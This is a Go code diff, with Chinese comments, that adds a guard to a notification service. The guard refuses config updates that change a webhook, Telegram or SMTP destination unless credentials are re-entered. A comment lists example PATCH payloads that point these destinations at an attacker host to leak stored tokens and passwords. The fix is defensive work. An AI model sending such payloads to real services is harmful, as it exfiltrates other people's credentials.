@@ -1,6 +1,10 @@
 package notify
 
-import "strings"
+import (
+	"encoding/json"
+	"fmt"
+	"strings"
+)
 
 // MaskedPrefix 是掩码值的标记前缀。API 回显凭据时用带此前缀的值替换真实内容，
 // 更新接口收到带此前缀的值即理解为「保持库中原值不变」。
@@ -56,6 +60,139 @@ func MaskConfig(kind string, cfg map[string]any) map[string]any {
 		out[k] = MaskedPrefix
 	}
 	return out
+}
+
+// ErrDestinationChangedWithoutCredentials 表示「目标地址变了，但调用方没有对
+// 凭据字段表态」。返回它而不是默默放行或默默丢弃凭据，理由见 PrepareConfigUpdate。
+type ErrDestinationChangedWithoutCredentials struct {
+	Changed []string // 发生变化的目的地键
+	Missing []string // 未显式表态的凭据键
+}
+
+func (e *ErrDestinationChangedWithoutCredentials) Error() string {
+	return "目标地址（" + strings.Join(e.Changed, "、") + "）已变更，请同时重新填写凭据字段（" +
+		strings.Join(e.Missing, "、") + "）：填入新值，或显式留空表示不再需要凭据。" +
+		"原凭据只对旧地址有效，继续沿用等于把它交给新地址。"
+}
+
+// PrepareConfigUpdate 合并渠道配置，并处理「目标地址变更」这一安全敏感情况。
+//
+// 它替代裸的 MergeConfig 用在渠道更新路径上，解决的是这样一条实测可行的路径：
+// 目标地址（消息发往哪）与凭据（用什么身份发）是两套独立字段，而 MergeConfig
+// 对「未提及的键」一律保留库中原值。于是任何能 PATCH 渠道的人只要**只改地址、
+// 对凭据避而不谈**，就能让服务器把库里的真凭据发到自己控制的端点：
+//
+//	webhook  {config:{url:"https://attacker.tld"}}  → 原始 Authorization 头随请求外发
+//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
+//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 后交出用户名与密码
+//
+// 这条路径完全静默、不依赖重定向（所以拒绝跨主机跳转挡不住它），
+// 而且直接击穿了本包掩码机制的目标——「凭据不回显给浏览器」。
+//
+// 规则：只要某个目的地键被改成新值，调用方就必须对**每一个**凭据键显式表态：
+//   - 给出新值 → 用新值
+//   - 显式传空串 → 该字段不再需要凭据（保留清空语义）
+//   - 原样回传掩码值 / 干脆不提这个键 → 拒绝
+//
+// 第三种之所以也拒绝，是因为「掩码值」的含义正是「沿用旧凭据」，而旧凭据
+// 只对旧地址有效。这里刻意不做「自动丢弃凭据」——那对可选凭据字段
+// （webhook 的 headers、email 的 password）会静默变成「鉴权没了但接口返回 200」，
+// 比报错更难排查。宁可让操作者多填一次。
+func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
+	channel, ok := Get(kind)
+	if !ok {
+		return nil, fmt.Errorf("渠道类型 %q 未注册", kind)
+	}
+	secrets := channel.SecretKeys()
+	destinations := channel.DestinationKeys()
+
+	// 非字符串的凭据值（如 webhook 的 headers 是个对象）里若嵌着掩码字面量，
+	// 说明调用方把「保持原值」的哨兵塞进了结构体内部。MergeConfig 只认「字符串
+	// 且带前缀」为掩码，这种形态会被当普通对象原样存下去——库里真的落下字面量
+	// "__masked__"，后续鉴权静默失效且没有任何报错。宁可拒掉。
+	//
+	// 这个检查必须放在**最前面**：地址没变时会走提前返回，放在后面就等于
+	// 只覆盖了「改地址」这一条路径（第一版就是这么放错的，测试直接抓到了）。
+	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
+		return nil, err
+	}
+
+	// 找出真正被改掉的目的地键。掩码值等于「没改」。
+	var changed []string
+	for _, key := range destinations {
+		raw, present := incoming[key]
+		if !present {
+			continue
+		}
+		s, isStr := raw.(string)
+		if isStr && IsMasked(s) {
+			continue
+		}
+		if !sameConfigValue(raw, stored[key]) {
+			changed = append(changed, key)
+		}
+	}
+	if len(changed) == 0 {
+		// 地址没变，走普通合并（掩码值保留原值、空串清空、其余覆盖）。
+		return MergeConfig(stored, incoming), nil
+	}
+
+	// 地址变了：要求对每个凭据键显式表态。
+	var missing []string
+	for _, key := range secrets {
+		raw, present := incoming[key]
+		if !present {
+			missing = append(missing, key)
+			continue
+		}
+		if s, isStr := raw.(string); isStr && IsMasked(s) {
+			missing = append(missing, key)
+		}
+	}
+	if len(missing) > 0 {
+		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
+	}
+	return MergeConfig(stored, incoming), nil
+}
+
+// rejectMaskedInContainers 拒绝把掩码哨兵嵌在非字符串结构里提交。
+//
+// 掩码机制的前提是「整个值就是个字符串」。像 webhook 的 headers 这种对象字段，
+// 只能整体掩码（写成字符串 "__masked__"）或整体提交；把哨兵塞进对象内部
+// 既表达不了「保持不变」，又会被当成真实值存进库。
+func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
+	for _, key := range secretKeys {
+		raw, present := incoming[key]
+		if !present {
+			continue
+		}
+		if _, isStr := raw.(string); isStr {
+			continue
+		}
+		encoded, err := json.Marshal(raw)
+		if err != nil {
+			continue
+		}
+		if strings.Contains(string(encoded), MaskedPrefix) {
+			return fmt.Errorf("字段 %s 的内容里含掩码标记 %q：该字段只能整体留空表示沿用、或整体提交新值，不能在结构体内部夹带掩码占位",
+				key, MaskedPrefix)
+		}
+	}
+	return nil
+}
+
+// sameConfigValue 比较两个配置值是否等价。用 JSON 序列化比较是为了顺带处理
+// 类型差异——前端提交的端口是 number，而库里读回来的是 float64，直接 == 会误判。
+func sameConfigValue(a, b any) bool {
+	if a == nil && b == nil {
+		return true
+	}
+	ra, errA := json.Marshal(a)
+	rb, errB := json.Marshal(b)
+	if errA != nil || errB != nil {
+		return false
+	}
+	return string(ra) == string(rb)
 }
 
 // MergeConfig 把 incoming 合并到 stored 之上，用于更新渠道配置。
